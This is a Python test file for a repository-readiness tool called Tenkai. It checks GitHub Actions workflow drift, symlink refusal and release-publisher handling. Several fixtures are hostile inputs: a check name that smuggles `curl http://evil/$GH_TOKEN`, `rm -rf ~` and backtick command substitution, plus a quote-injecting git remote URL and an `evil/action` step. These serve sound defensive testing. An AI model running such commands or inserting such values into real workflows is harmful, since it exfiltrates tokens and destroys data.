          dest == dhp / "myhooks" / "commit-msg", f"got {dest}")
    (dhp / "myhooks" / "commit-msg").write_text("#!/bin/sh\nexit 0\n")
    check("a hook in core.hooksPath is seen as present",
          NenCommitMsgHook().detect(ctx_for(dhp))["state"] == SATISFIED)

    print("\nTWO-PR ORDERING — handled, never hit")
    d2 = fixture(with_guard=True, registered=False)
    res = run("apply", ctx_for(d2))
    by = {r["id"]: r for r in res["items"]}
    check("an unregistered guard stages the workflow", by[WORKFLOW_PATH]["state"] == STAGED)
    check("apply did NOT write the workflow", not (d2 / WORKFLOW_PATH).is_file())
    check("the registration is routed with the ordering stated",
          by["guard/registration"]["state"] == ROUTED)
    check("PORTABLE_HOSTED_WORKFLOWS' double duty is named in the action",
          "required-PRESENCE list" in (by["guard/registration"]["action"] or ""))
    check("the run is outstanding, so nobody reads it as done", res["outstanding"] > 0)

    d3 = fixture(with_guard=True, registered=True)
    res = run("apply", ctx_for(d3))
    by = {r["id"]: r for r in res["items"]}
    check("once registered, the workflow lands", by[WORKFLOW_PATH]["state"] == REPAIRED)
    check("and the file is really there", (d3 / WORKFLOW_PATH).is_file())

    print("\ndiagnose is READ-ONLY")

    def snapshot(root: Path):
        """{path: sha256} over everything, INCLUDING .git/hooks.

        The old proof compared NAMES and filtered out `.git/`, which is the one
        directory the hook item could write into -- so a regression that installed
        a hook during `detect` would have passed it green. Content hashes also
        catch an in-place rewrite of an existing path, which a name list cannot.
        """
        out = {}
        for f in root.rglob("*"):
            rel = str(f.relative_to(root))
            if rel.startswith(".git/objects") or rel.startswith(".git/index"):
                continue
            if f.is_file():
                out[rel] = hashlib.sha256(f.read_bytes()).hexdigest()
        return out

    d4 = fixture()
    before = snapshot(d4)
    run("diagnose", ctx_for(d4))
    after = snapshot(d4)
    check("diagnose wrote nothing — by CONTENT, over the whole tree including .git/hooks",
          before == after, f"changed: {sorted(set(before) ^ set(after))}")

    print("\nTHE AUTOMATED REVIEWER'S EIGHT — every one gets a fixture")
    dr = fixture()
    run("apply", ctx_for(dr, vis="public", sh=0, labels=None))
    wr = dr / WORKFLOW_PATH
    orig = wr.read_text()

    def mutate(fn):
        wr.write_text(fn(orig))
        row = ReadinessWorkflow().detect(ctx_for(dr, vis="public", sh=0, labels=None))
        wr.write_text(orig)
        return row

    # T3 -- the FORK LIMB, half the guard, previously unchecked
    row = mutate(lambda t: t.replace(
        " && github.event.pull_request.head.repo.full_name == github.repository", ""))
    check("dropping the fork limb while keeping the slug is DRIFT",
          row["state"] == DRIFT and "FORK limb" in row["detail"])

    # T4 -- a decoy `--gates` in an echo, with the real call missing it
    row = mutate(lambda t: t.replace(
        '--gates "$PWD/.trusted/nen/gates.json"', "").replace(
        "          set -uo pipefail",
        "          set -uo pipefail\n          echo '--gates \"$PWD/.trusted/nen/gates.json\"'", 1))
    check("a decoy --gates beside a real call without it is DRIFT",
          row["state"] == DRIFT and "--gates" in row["detail"])

    # T5 -- github.sha is PR-controlled on pull_request_review
    row = mutate(lambda t: t.replace("ref: ${{ github.event.pull_request.base.sha }}",
                                     "ref: ${{ github.sha }}"))
    check("a .trusted ref that is not the BASE sha is DRIFT",
          row["state"] == DRIFT and "base sha" in row["detail"])

    # T6 -- three write-scope forms that previously produced no drift at all
    for label, fn in (
        ("write-all",      lambda t: t.replace("permissions:\n  checks: write", "permissions: write-all")),
        ("inline mapping", lambda t: t.replace("permissions:\n  checks: write",
                                               "permissions: { checks: write, contents: write }")),
        ("deeper indent",  lambda t: t.replace("permissions:\n  checks: write",
                                               "permissions:\n    checks: write\n    contents: write")),
    ):
        row = mutate(fn)
        check(f"write scope via {label} is DRIFT", row["state"] == DRIFT and "write" in row["detail"])

    # T1 -- runner labels are substituted into runs-on, so they are validated too
    for bad in ("[self-hosted] # x\n    env: evil", "${{ github.event.pull_request.title }}",
                "[self-hosted, Linux]: {x: y}"):
        try:
            Ctx(fixture(), root, "acme/widget", "private", 1, probe=False, runner_labels=bad)
            check(f"hostile --runner-labels {bad[:24]!r} refused", False, "accepted")
        except SystemExit as exc:
            check(f"hostile --runner-labels {bad[:24]!r} refused", exc.code == 2)
    check("an ordinary label set is still accepted",
          LABELS_RE.match("[self-hosted, Linux, X64]") is not None)

    # T2 -- a symlinked colors.yml must never be followed
    dsym = fixture()
    (dsym / "nen").mkdir(parents=True, exist_ok=True)
    outside = Path(tempfile.mkdtemp(prefix="tenkai-outside-")); _FIXTURES.append(outside)
    victim = outside / "victim.yml"
    victim.write_text("do not touch me\n")
    (dsym / "nen" / "colors.yml").symlink_to(victim)
    row = ColorsFile().detect(ctx_for(dsym))
    check("a symlinked colors.yml is BLOCKED, never followed", row["state"] == BLOCKED)
    ColorsFile().repair(ctx_for(dsym))
    check("and apply did not write through the link",
          victim.read_text() == "do not touch me\n")

    # T7 -- `# categories:` in a COMMENT must not satisfy the check
    dcm = fixture()
    (dcm / "nen").mkdir(parents=True, exist_ok=True)
    (dcm / "nen" / "colors.yml").write_text("# categories:\nversion: 1\n")
    check("a commented-out categories block is DRIFT, not satisfied",
          ColorsFile().detect(ctx_for(dcm))["state"] == DRIFT)
    (dcm / "nen" / "colors.yml").write_text("version: 1\ncategories:\n")
    check("an EMPTY categories block is DRIFT too",
          ColorsFile().detect(ctx_for(dcm))["state"] == DRIFT)

    print("\nTHE SECOND REVIEWER ROUND — six more, each with its own fixture")
    dr2 = fixture()
    run("apply", ctx_for(dr2, vis="public", sh=0, labels=None))
    w2 = dr2 / WORKFLOW_PATH
    base2 = w2.read_text()

    def mut2(fn):
        w2.write_text(fn(base2))
        row = ReadinessWorkflow().detect(ctx_for(dr2, vis="public", sh=0, labels=None))
        w2.write_text(base2)
        return row

    # U3 -- an arbitrary action wearing the .trusted marker
    row = mut2(lambda t: t.replace("uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          path: .trusted",
                                   "uses: evil/action@v1\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          path: .trusted"))
    check("a non-checkout action in the .trusted block is DRIFT",
          row["state"] == DRIFT and "actions/checkout" in row["detail"])

    # U4 -- a JOB-level permissions block overrides the workflow-level one
    row = mut2(lambda t: t.replace("    runs-on:", "    permissions:\n      contents: write\n    runs-on:", 1))
    check("a job-level write permission is DRIFT even with a clean top block",
          row["state"] == DRIFT and "write" in row["detail"])

    # U5 -- run: > and inline run:, neither of which was parsed
    for label, frag in (("folded", 'run: >\n          echo "${{ github.event.pull_request.title }}"'),
                        ("inline", 'run: echo "${{ github.event.pull_request.title }}"')):
        row = mut2(lambda t, f=frag: t.replace("        shell: bash", "        " + f, 1))
        check(f"a {label} run body interpolating an expression is DRIFT",
              row["state"] == DRIFT and "run:" in row["detail"])

    # U6 -- an unread probe must not silently downgrade the runner
    du6 = fixture()
    run("apply", ctx_for(du6))                                  # private + labels -> labelled set
    wu6 = du6 / WORKFLOW_PATH
    before_runs_on = re.search(r"runs-on:\s*(\[[^\]]*\])", wu6.read_text()).group(1)
    wu6.write_text(wu6.read_text().replace('--gates "$PWD/.trusted/nen/gates.json"', ""))
    ReadinessWorkflow().repair(Ctx(du6, root, "acme/widget", None, 0, probe=False))
    after_runs_on = re.search(r"runs-on:\s*(\[[^\]]*\]|\S+)", "\n".join(
        l for l in wu6.read_text().splitlines() if not l.lstrip().startswith("#"))).group(1)
    check("repairing an unrelated drift with an unread probe PRESERVES the runner",
          after_runs_on == before_runs_on, f"{before_runs_on} -> {after_runs_on}")

    # U1 + U2 -- symlinked managed dir and .gitignore
    dsl = fixture()
    ext = Path(tempfile.mkdtemp(prefix="tenkai-outside-")); _FIXTURES.append(ext)
    (dsl / "Reports").symlink_to(ext)
    check("a symlinked managed directory is BLOCKED",
          IgnoredDir("dirs/reports", "Reports", "x").detect(ctx_for(dsl))["state"] == BLOCKED)
    dgi = fixture()
    victim2 = ext / "their.gitignore"; victim2.write_text("theirs\n")
    (dgi / ".gitignore").symlink_to(victim2)
    row = IgnoredDir("dirs/nen-state", ".nen", "x").repair(ctx_for(dgi))
    check("a symlinked .gitignore is BLOCKED", row["state"] == BLOCKED)
    check("and apply did not append through the link", victim2.read_text() == "theirs\n")

    print("\nREPOSITORY ROLE — derived from the registry, never invented")
    dproc = fixture(role=ROLE_PROCESS)
    dprod = fixture(role=ROLE_PRODUCT)
    dnone = fixture(role=None)
    run("apply", ctx_for(dprod))
    product_workflow = (dprod / WORKFLOW_PATH).read_text()
    check("a consumer can run without Hatsu's Ruby guard",
          "TENKAI_GUARD_REQUIRED: false" in product_workflow
          and 'if [ -f .trusted/scripts/workflow_runner_policy_check.rb ]; then' in product_workflow)
    check("a consumer without a dependency block gets Hatsu's verified Nen ref",
          "TENKAI_PIN_FALLBACK_ALLOWED: true" in product_workflow
          and f"TENKAI_FALLBACK_REF: {ctx_for(dprod).nen_ref()}" in product_workflow
          and 'ref="$TENKAI_FALLBACK_REF"' in product_workflow)
    pin_step = product_workflow.split(
        "      - name: Read the pinned nen ref from trusted nen/contract.json", 1)[1]
    pin_step = pin_step.split("      - name: Bootstrap nen at the trusted pinned ref", 1)[0]
    pin_body = pin_step.split("        run: |\n", 1)[1]
    pin_script = "\n".join(line[10:] if line.startswith("          ") else line
                           for line in pin_body.splitlines())
    with tempfile.TemporaryDirectory() as pin_tmp:
        pin_dir = Path(pin_tmp)
        output_path = pin_dir / "github-output.txt"
        env = dict(os.environ, TENKAI_PIN_FALLBACK_ALLOWED="true",
                   TENKAI_FALLBACK_REF=ctx_for(dprod).nen_ref(),
                   GITHUB_OUTPUT=str(output_path))
        missing_pin = subprocess.run(["bash", "-c", pin_script], cwd=pin_dir,
                                     env=env, capture_output=True, text=True)
        check("consumer pin step executes fallback when trusted contract is absent",
              missing_pin.returncode == 0
              and output_path.read_text().strip() == f"ref={ctx_for(dprod).nen_ref()}")
        (pin_dir / ".trusted" / "nen").mkdir(parents=True)
        (pin_dir / ".trusted" / "nen" / "contract.json").write_text("{bad json")
        output_path.write_text("")
        bad_pin = subprocess.run(["bash", "-c", pin_script], cwd=pin_dir,
                                 env=env, capture_output=True, text=True)
        check("a malformed trusted contract fails closed before consumer fallback",
              bad_pin.returncode != 0 and "malformed or unreadable" in bad_pin.stdout
              and output_path.read_text() == "")
        for label, contract in (
                ("non-object root", []),
                ("null dependency", {"dependency": None}),
                ("numeric pinned ref", {"dependency": {"pinned_ref": 123}}),
                ("empty pinned ref", {"dependency": {"pinned_ref": ""}})):
            (pin_dir / ".trusted" / "nen" / "contract.json").write_text(json.dumps(contract))
            output_path.write_text("")
            bad_shape = subprocess.run(["bash", "-c", pin_script], cwd=pin_dir,
                                       env=env, capture_output=True, text=True)
            check(f"a trusted contract with {label} fails closed",
                  bad_shape.returncode != 0 and "malformed or unreadable" in bad_shape.stdout
                  and output_path.read_text() == "")
        (pin_dir / ".trusted" / "nen" / "contract.json").write_text("{}")
        output_path.write_text("")
        omitted_pin = subprocess.run(["bash", "-c", pin_script], cwd=pin_dir,
                                     env=env, capture_output=True, text=True)
        check("a valid consumer contract may omit dependency and use the fallback",
              omitted_pin.returncode == 0
              and output_path.read_text().strip() == f"ref={ctx_for(dprod).nen_ref()}")
    product_workflow_path = dprod / WORKFLOW_PATH
    product_workflow_path.write_text(product_workflow.replace(
        "TENKAI_GUARD_REQUIRED: false", "TENKAI_GUARD_REQUIRED: true"))
    row = ReadinessWorkflow().detect(ctx_for(dprod))
    check("a consumer workflow requiring Hatsu's absent guard is DRIFT",
          row["state"] == DRIFT and "Ruby guard" in row["detail"])
    product_workflow_path.write_text(product_workflow.replace(
        "TENKAI_PIN_FALLBACK_ALLOWED: true", "TENKAI_PIN_FALLBACK_ALLOWED: false"))
    row = ReadinessWorkflow().detect(ctx_for(dprod))
    check("a consumer workflow with no Nen pin fallback is DRIFT",
          row["state"] == DRIFT and "pin step" in row["detail"])
    product_workflow_path.write_text(product_workflow.replace(
        'if [ -f .trusted/nen/contract.json ]; then',
        '# stale pin guard removed by old rendering'))
    row = ReadinessWorkflow().detect(ctx_for(dprod))
    check("an older consumer workflow reading a missing trusted contract is DRIFT",
          row["state"] == DRIFT and "pin step" in row["detail"])
    decoy = product_workflow.replace(
        '          if [ -f .trusted/nen/contract.json ]; then\n'
        '            if ! ref="$(jq -r',
        '          echo \'if [ -f .trusted/nen/contract.json ]; then\'\n'
        '          echo \'if ! ref="$(jq -r\'\n'
        '          if ! ref="$(jq -r')
    product_workflow_path.write_text(decoy)
    row = ReadinessWorkflow().detect(ctx_for(dprod))
    check("echo decoys cannot hide an unguarded trusted-contract read",
          row["state"] == DRIFT and "pin step" in row["detail"])
    product_workflow_path.write_text(product_workflow)
    check("maintained_tools derives process", derive_role(dproc, "acme/widget") == ROLE_PROCESS)
    check("consumers derives product", derive_role(dprod, "acme/widget") == ROLE_PRODUCT)
    check("a registry naming neither derives NOTHING, never a guess",
          derive_role(dnone, "acme/widget") is None)

    row = ReleaseRow().detect(ctx_for(dnone))
    check("an underivable role BLOCKS rather than assuming product", row["state"] == BLOCKED)
    check("and says Tenkai does not classify a repository for itself",
          "does not classify" in row["detail"])

    # Products choose their own publisher, but a release seat is a visible gap.
    check("a product repo gets no generic process publisher",
          ReleasePublisher().detect(ctx_for(dprod))["state"] == SATISFIED)
    check("a product with no contract is routed to nen scaffold",
          ReleaseRow().detect(ctx_for(dprod))["state"] == ROUTED)
    ReleasePublisher().repair(ctx_for(dprod))
    check("no generic publisher is rendered into a product repo",
          not (dprod / ReleasePublisher.REL).is_file())
    (dprod / "nen" / "contract.json").write_text(json.dumps({"project": {
        "defaultLane": "windows",
        "lanes": {"windows": {"stack": "dotnet-winui"}, "focused": {"stack": "dotnet-winui"}},
        "verbs": {"windows": {"build": {"exe": "dotnet", "argv": ["build"]},
                              "lint": {"unsupported": "No linter"},
                              "release": {"unsupported": "No publisher"}},
                  "focused": {"test": {"exe": "dotnet", "argv": ["test"]}}}}}))
    (dprod / "nen" / "workflow.json").write_text(json.dumps({"iteration": {
        "lane": "windows", "checks": ["build", "test"]}}))
    product = run("diagnose", ctx_for(dprod))
    product_by = {r["id"]: r for r in product["items"]}
    check("a product release seat is routed per lane, with destination choice named",
          product_by["lane/windows/release"]["state"] == ROUTED
          and "destination" in (product_by["lane/windows/release"]["action"] or ""))
    check("a product lint seat is visible with its reason",
          product_by["lane/windows/lint"]["state"] == ROUTED
          and "No linter" in product_by["lane/windows/lint"]["detail"])
    check("a real build row is satisfied",
          product_by["lane/windows/build"]["state"] == SATISFIED)
    check("a malformed release scalar is routed, never called executable",
          LaneVerb("windows", "release", "not-a-command").detect(ctx_for(dprod))["state"] == ROUTED)
    check("a malformed command argv is routed",
          LaneVerb("windows", "test", {"exe": "dotnet", "argv": "test"}).detect(
              ctx_for(dprod))["state"] == ROUTED)
    check("a valid multi-step command is satisfied",
          LaneVerb("windows", "test", {"steps": [{"exe": "dotnet", "argv": ["test"]}]}).detect(
              ctx_for(dprod))["state"] == SATISFIED)
    check("an absent required iteration test row is routed",
          product_by["lane/windows/test"]["state"] == ROUTED)
    check("a focused test lane owes only its declared test",
          "lane/focused/build" not in product_by
          and product_by["lane/focused/test"]["state"] == SATISFIED)
    check("a product with no toolchain cannot report host readiness",
          product_by["workflow/toolchain"]["state"] == ROUTED)
    product_contract = json.loads((dprod / "nen" / "contract.json").read_text())
    product_contract["project"]["verbs"]["windows"]["test"] = {
        "exe": "dotnet", "argv": ["test"]}
    product_contract["project"]["verbs"]["windows"]["ui-test"] = {
        "exe": "dotnet", "argv": ["vstest"]}
    (dprod / "nen" / "contract.json").write_text(json.dumps(product_contract))
    (dprod / "nen" / "workflow.json").write_text(json.dumps({
        "iteration": {"lane": "windows", "checks": ["build", "test"]},
        "tests": {"required": ["test"], "extra": []},
        "coverage": {"minimum": 80, "recommended": 85, "ideal": 90}}))
    product_by = {r["id"]: r for r in run("diagnose", ctx_for(dprod))["items"]}
    check("an unselected UI suite is routed to the test policy",
          product_by["workflow/test-selection/ui-test"]["state"] == ROUTED)
    check("a selected test without a result artifact is routed",
          product_by["workflow/test-results"]["state"] == ROUTED)
    check("a coverage ladder without a capture row is routed",
          product_by["workflow/coverage"]["state"] == ROUTED)
    check("a UI lane without a snapshot evidence block is routed",
          product_by["workflow/evidence"]["state"] == ROUTED)
    before = (dprod / "nen" / "contract.json").read_bytes()
    run("apply", ctx_for(dprod))
    check("apply never rewrites a product's nen declaration",
          before == (dprod / "nen" / "contract.json").read_bytes())
    product_contract = json.loads(before)
    product_contract["project"]["verbs"]["windows"]["release"] = {
        "exe": "powershell", "argv": ["-File", "scripts/release.ps1"]}
    (dprod / "nen" / "contract.json").write_text(json.dumps(product_contract))
    check("a product with a real release row is satisfied",
          ReleaseRow().detect(ctx_for(dprod))["state"] == SATISFIED)
    del product_contract["project"]["verbs"]["windows"]["release"]
    (dprod / "nen" / "contract.json").write_text(json.dumps(product_contract))
    absent_release = {r["id"]: r for r in run("diagnose", ctx_for(dprod))["items"]}
    check("a product with no release row anywhere is routed on its default lane",
          absent_release["lane/windows/release"]["state"] == ROUTED
          and "no product release command" in absent_release["lane/windows/release"]["detail"])
    no_default_product = fixture(role=ROLE_PRODUCT)
    (no_default_product / "nen" / "contract.json").write_text(json.dumps({"project": {
        "lanes": {"store-msix": {"stack": "dotnet-winui"},
                  "github-msix": {"stack": "dotnet-winui"}},
        "verbs": {"store-msix": {"archive": {"unsupported": "identity pending"}},
                  "github-msix": {"archive": {"unsupported": "signing pending"}}}}}))
    (no_default_product / "nen" / "workflow.json").write_text("{}")
    no_default_rows = {r["id"]: r for r in run("diagnose", ctx_for(no_default_product))["items"]}
    check("a product with no default lane still routes its missing release destination",
          no_default_rows["workflow/release-destination"]["state"] == ROUTED
          and "which declared lane(s)" in
          (no_default_rows["workflow/release-destination"]["action"] or ""))

    # A PROCESS repository gets the publisher, and the ROW is OFFERED not written.
    res = run("apply", ctx_for(dproc))
    by = {r["id"]: r for r in res["items"]}
    check("a process repo gets the publisher rendered",
          by[ReleasePublisher.REL]["state"] == REPAIRED and (dproc / ReleasePublisher.REL).is_file())
    check("the rendered publisher is executable",
          os.access(dproc / ReleasePublisher.REL, os.X_OK))
    # With no contract at all, the row routes to the contract itself rather than
    # telling the maintainer to edit a file that does not exist.
    check("with no contract, the row routes to nen scaffold init",
          by["release/row"]["state"] == ROUTED
          and "nen scaffold init" in (by["release/row"]["action"] or ""))
    # A contract WITHOUT a defaultLane cannot name the lane, and Tenkai does not
    # pick one on nen's behalf.
    (dproc / "nen").mkdir(parents=True, exist_ok=True)
    (dproc / "nen" / "contract.json").write_text(json.dumps({"project": {
        "lanes": {"a": {"stack": "x"}, "b": {"stack": "y"}}, "verbs": {}}}))
    rr = ReleaseRow().detect(ctx_for(dproc))
    check("no defaultLane BLOCKS — the lane is never guessed", rr["state"] == BLOCKED)
    check("and it says nen makes --lane required in that case", "--lane" in rr["detail"])
    # With a defaultLane and a seat, the exact row is offered.
    (dproc / "nen" / "contract.json").write_text(json.dumps({"project": {
        "defaultLane": "plugin",
        "lanes": {"plugin": {"stack": "claude-code-plugin"}},
        "verbs": {"plugin": {"release": {"unsupported": "nothing publishes here"}}}}}))
    rr = ReleaseRow().detect(ctx_for(dproc))
    check("the release ROW is routed, never written", rr["state"] == ROUTED)
    check("and the exact row to declare is offered",
          '"argv"' in (rr["action"] or "") and ReleasePublisher.REL in (rr["action"] or ""))
    # On its OWN fixture, so a later case writing a contract cannot mask it.
    dnw = fixture(role=ROLE_PROCESS)
    run("apply", ctx_for(dnw))
    check("nen/contract.json is NEVER written by Tenkai",
          not (dnw / "nen" / "contract.json").is_file())

    # A seat is named as a seat, with the consequence, not merely as 'missing'.
    (dproc / "nen").mkdir(parents=True, exist_ok=True)
    (dproc / "nen" / "contract.json").write_text(json.dumps({"project": {
        "defaultLane": "plugin",
        "lanes": {"plugin": {"stack": "claude-code-plugin"}},
        "verbs": {"plugin": {"release": {"unsupported": "nothing publishes here"}}}}}))
    row = ReleaseRow().detect(ctx_for(dproc))
    check("a SEAT is routed with mugetsu's consequence named",
          row["state"] == ROUTED and "mugetsu" in row["detail"])
    check("and the offered row names this repo's own lane and stack",
          "plugin" in row["detail"] and "claude-code-plugin" in row["detail"])

    # A real row satisfies it.
    (dproc / "nen" / "contract.json").write_text(json.dumps({"project": {
        "defaultLane": "plugin",
        "lanes": {"plugin": {"stack": "claude-code-plugin"}},
        "verbs": {"plugin": {"release": {"exe": "bash", "argv": [ReleasePublisher.REL]}}}}}))
    check("a real release row is satisfied",
          ReleaseRow().detect(ctx_for(dproc))["state"] == SATISFIED)

    # SOMEBODY ELSE'S PUBLISHER IS SOMEBODY ELSE'S.
    dfp = fixture(role=ROLE_PROCESS)
    (dfp / "scripts").mkdir(parents=True, exist_ok=True)
    (dfp / ReleasePublisher.REL).write_text("#!/bin/sh\n# mine\nexit 0\n")
    r = ReleasePublisher().repair(ctx_for(dfp))
    check("a hand-written publisher is DRIFT, not overwritten", r["state"] == DRIFT)
    check("and its bytes survive", "# mine" in (dfp / ReleasePublisher.REL).read_text())

    # T5 — a syntactically valid but wrongly SHAPED registry must not crash.
    dbad = fixture(role=None)
    (dbad / "nen").mkdir(parents=True, exist_ok=True)
    for shape in ("[]", '"a string"', '{"maintained_tools": "not-a-list"}', "123"):
        (dbad / "nen" / "repos.json").write_text(shape)
        try:
            got = derive_role(dbad, "acme/widget")
            check(f"a registry shaped {shape[:22]!r} returns unknown, never a crash", got is None)
        except Exception as exc:
            check(f"a registry shaped {shape[:22]!r} returns unknown, never a crash", False, repr(exc))

    # T2 — a SYMLINKED PARENT DIRECTORY must not be written through.
    dsp = fixture(role=ROLE_PROCESS)
    outside2 = Path(tempfile.mkdtemp(prefix="tenkai-outside-")); _FIXTURES.append(outside2)
    (dsp / "scripts").symlink_to(outside2)
    row = ReleasePublisher().repair(ctx_for(dsp))
    check("a symlinked parent directory is BLOCKED", row["state"] == BLOCKED)
    check("and nothing was written outside the repository",
          not (outside2 / "release-publish.sh").exists())

    # T7 — the marker proves PROVENANCE; currency is proved by the bytes.
    dst = fixture(role=ROLE_PROCESS)
    ReleasePublisher().repair(ctx_for(dst))
    stale = (dst / ReleasePublisher.REL)
    stale.write_text(stale.read_text().replace("set -euo pipefail",
                                               "set -euo pipefail\n# an older rendering", 1))
    row = ReleasePublisher().detect(ctx_for(dst))
    check("a MARKED but stale publisher is DRIFT, not satisfied",
          row["state"] == DRIFT and "older Tenkai" in row["detail"])
    ReleasePublisher().repair(ctx_for(dst))
    check("and a stale rendering IS repaired",
          ReleasePublisher().detect(ctx_for(dst))["state"] == SATISFIED)

    # The shipped template and Hatsu's own rendering are ONE engine.
    tmpl = (root / "templates" / "release-publish.sh").read_text()
    mine = (root / "scripts" / "release-publish.sh").read_text()
    check("templates/release-publish.sh and scripts/release-publish.sh are the same engine",
          tmpl == mine)

    print("\nCLAIMS THAT HAD NO FIXTURE — the combination that rots quietly")
    # A TUNED colors.yml MUST SURVIVE. § 4 and Hard limits both promise the engine
    # never compares it byte-for-byte against the seed; nothing tested it.
    dt = fixture()
    (dt / "nen").mkdir(parents=True, exist_ok=True)
    tuned = ("version: 1\ncategories:\n  my_own_family:\n    precedence: [a]\n"
             "    values:\n      a:\n        label: Mine\n")
    (dt / "nen" / "colors.yml").write_text(tuned)
    check("a tuned colors.yml is satisfied, not compared to the seed",
          ColorsFile().detect(ctx_for(dt))["state"] == SATISFIED)
    ColorsFile().repair(ctx_for(dt))
    check("and apply leaves its bytes untouched",
          (dt / "nen" / "colors.yml").read_text() == tuned)

    # THE GUARD-COMMENT CASE. This repository's own guard names the file in a
    # comment, so a whole-file substring was comment-strength, not grep-strength.
    dc = fixture()
    (dc / GUARD_PATH).parent.mkdir(parents=True, exist_ok=True)
    (dc / GUARD_PATH).write_text("# TODO: someday register pr-readiness.yml here\n"
                                 "EXPECTED_JOBS = {}.freeze\n")
    check("a guard naming the file only in a COMMENT is unregistered",
          GuardRegistration.state_of(ctx_for(dc)) == "unregistered")
    res = run("apply", ctx_for(dc))
    check("so the workflow is staged, not written", not (dc / WORKFLOW_PATH).is_file())
    # PORTABLE_HOSTED_WORKFLOWS must not satisfy it either -- the routed action
    # explicitly tells the maintainer NOT to add the file there yet.
    (dc / GUARD_PATH).write_text("PORTABLE_HOSTED_WORKFLOWS = %w[pr-readiness.yml].freeze\n")
    check("naming it ONLY in PORTABLE_HOSTED_WORKFLOWS is still unregistered",
          GuardRegistration.state_of(ctx_for(dc)) == "unregistered")

    # THE "NEW REPOSITORY" HALF OF THE SKILL'S OWN DESCRIPTION.
    dn = Path(tempfile.mkdtemp(prefix="tenkai-fixture-")); _FIXTURES.append(dn)
    for _ in range(3):
        run("apply", Ctx(dn, root, "acme/widget", "public", 0, probe=False))
    gi = dn / ".gitignore"
    check("three applies to a NON-GIT directory do not grow .gitignore",
          not gi.is_file() or gi.read_text().count("Reports/") <= 1,
          gi.read_text() if gi.is_file() else "(absent)")

    ds = fixture()
    subprocess.run(["git", "-C", str(ds), "remote", "remove", "origin"], check=True)
    row = ReadinessWorkflow().repair(Ctx(ds, root, None, "public", 0, probe=False))
    check("no slug resolvable -> BLOCKED, never a placeholder predicate",
          row["state"] == BLOCKED)
    check("and nothing is written", not (ds / WORKFLOW_PATH).is_file())

    # A HOSTILE SLUG must be refused before it reaches a predicate or a URL.
    dh = Path(tempfile.mkdtemp(prefix="tenkai-fixture-")); _FIXTURES.append(dh)
    subprocess.run(["git", "-C", str(dh), "init", "-q"], check=True)
    subprocess.run(["git", "-C", str(dh), "remote", "add", "origin",
                    "https://github.com/acme/widget' || true || '.git"], check=True)
    try:
        Ctx(dh, root, None, "public", 0, probe=False)
        check("a quote-bearing slug is refused before it is rendered", False, "it was accepted")
    except SystemExit as exc:
        check("a quote-bearing slug is refused before it is rendered", exc.code == 2)
    check("slug grammar accepts the ordinary case", slug_ok("zheref/hatsu"))
    check("slug grammar rejects a traversal", not slug_ok("x/../../user"))

    # SOMEBODY ELSE'S WORKFLOW IS SOMEBODY ELSE'S.
    dw = fixture()
    (dw / WORKFLOW_PATH).parent.mkdir(parents=True, exist_ok=True)
    (dw / WORKFLOW_PATH).write_text("name: mine\non: push\njobs: {}\n")
    row = ReadinessWorkflow().repair(ctx_for(dw))
    check("a hand-written pr-readiness.yml is NOT overwritten", row["state"] == DRIFT)
    check("and its bytes survive", "name: mine" in (dw / WORKFLOW_PATH).read_text())

    # AN UNREAD PROBE IS NOT A CHANGED FACT.
    du = fixture()
    run("apply", ctx_for(du))
    row = ReadinessWorkflow().detect(Ctx(du, root, "acme/widget", None, 0, probe=False))
    check("an unreadable visibility does not report runs-on drift", row["state"] == SATISFIED)
    check("and says the limb went unchecked", "runner limb unread" in row["detail"])

    # THE TEMPLATE AND THIS REPOSITORY'S OWN colors.yml ARE ONE VOCABULARY.
    def body(pth):
        return [l for l in pth.read_text().splitlines() if not l.lstrip().startswith("#")]
    check("templates/colors.yml and nen/colors.yml carry the same vocabulary",
          body(root / "templates" / "colors.yml") == body(root / "nen" / "colors.yml"))

    print("\ncheck exclusions -- the ruling's declared home, its shape and its expiry (zheref/hatsu#104)")
    import datetime as _dt
    _today = _dt.date.today().isoformat()
    _old = (_dt.date.today() - _dt.timedelta(days=120)).isoformat()
    dx = fixture()
    (dx / "nen").mkdir(parents=True, exist_ok=True)
    gates = dx / "nen" / "gates.json"

    def ex(rows):
        gates.write_text(json.dumps({"check_exclusions": rows}))
        return CheckExclusions().detect(ctx_for(dx))

    def row(**kw):
        base = {"name": "check (Windows)", "reason": "no runner", "ruled": _today, "until": "2999-01-01"}
        base.update(kw)
        return base
    check("no gates.json is satisfied (nothing declared)", CheckExclusions().detect(ctx_for(dx))["state"] == SATISFIED)
    check("an empty array is satisfied, and said to be a decision", "decision" in ex([])["detail"])
    r = ex([row()])
    check("a live dated row is satisfied, named, with the clock named", r["state"] == SATISFIED and "check (Windows)" in r["detail"] and "zone" in r["detail"])
    r = ex([row(until="condition: the runner is enabled")])
    check("a condition row is live, reported with its condition", r["state"] == SATISFIED and "the runner is enabled" in r["detail"])
    r = ex([row(until="condition: the runner is enabled", ruled=_old)])
    check("a condition row older than 90 days is DRIFT, unconfirmed", r["state"] == DRIFT and "unconfirmed" in r["detail"] and "re-rule" in (r["action"] or ""))
    r = ex([row(until="2026-09-01")])
    check("a row past its until date is DRIFT, lapsed, with the re-rule action", r["state"] == DRIFT and "lapsed" in r["detail"] and "re-rule" in (r["action"] or ""))
    for near in ("2026-9-1", "09/01/2026", "2026-09-01 (or when the runner lands)", "the runner is enabled", "2026-02-30"):
        r = ex([row(until=near)])
        check(f"until {near!r} is neither a date nor a condition: DRIFT, never read as live", r["state"] == DRIFT and "neither" in r["detail"] or (near == "2026-02-30" and r["state"] == DRIFT))
    for badname in ("x\"; curl http://evil/$GH_TOKEN #", "ok\nrm -rf ~", "a`id`b", "check (Windows, windows-latest)", "lint, typecheck"):
        r = ex([row(name=badname)])
        check(f"name {badname[:24]!r} is refused at the declaration, never put on the call", r["state"] == DRIFT and "argv" in r["detail"] and "never put on the call" in r["detail"])
    r = ex([row(ruled="2999-01-01")])
    check("ruled in the future is DRIFT", r["state"] == DRIFT and "future" in r["detail"])
    r = ex([row(ruled="2026-9-1")])
    check("ruled not YYYY-MM-DD is DRIFT", r["state"] == DRIFT and "ruled" in r["detail"])
    r = ex([{"name": "check (Windows)", "ruled": _today}])
    check("a row missing a field is DRIFT, never honoured", r["state"] == DRIFT)
    gates.write_text(json.dumps({"check_exclusions": {"name": "x"}}))
    check("a non-array is DRIFT", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
    gates.write_text("[]")
